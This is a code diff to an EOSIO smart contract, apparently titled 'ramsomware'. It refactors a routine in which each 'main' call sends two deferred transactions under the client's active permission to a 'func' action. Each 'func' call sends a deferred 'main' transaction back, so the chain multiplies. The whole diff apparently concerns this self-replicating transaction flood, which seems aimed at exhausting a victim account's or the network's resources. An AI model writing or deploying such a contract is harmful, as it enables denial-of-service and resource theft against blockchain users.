@@ -41,27 +41,23 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
         {
             uint128_t initnum = 1;
 
-
             transaction out1{};
-            //transaction out2{};
             upsert(client, idx);
-            out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(idx * 2) ));
-            out1.send(idx * 2, client, false);
 
-            out1.actions.pop_back();
-            out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(idx * 2+1) ));
-            out1.send((idx * 2 + 1), client, false);
-            out1.actions.pop_back();
-            print("[+] CALL 1st: ", (idx*2), "\n");
-            print("[+] CALL 2nd: ", ((idx*2)+1), "\n");
+            int N = 2;
+            for (int i =0; i < N ; i ++)
+            { 
+                out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple( client, uint64_t(N * idx + (1-i)) ) );
+                out1.send(N * idx + (1-i), client, false);
+                out1.actions.pop_back();
+                print ("[+] Seq Number :%d \n", N * idx + (1-i) );
+            }
         };
         [[eosio::action]]
         void func(name client, uint64_t idx)
-        { // 123 567
-            //name client = name("reset");
+        {
             transaction out{};
             out.actions.emplace_back(permission_level{client, "active"_n}, _self, "main"_n, std::make_tuple(client, uint64_t(idx) ));
-            //out.delay_sec = 0;
             out.send((idx), client, false);
             print("\t[#] FUNC: ", idx);
         };
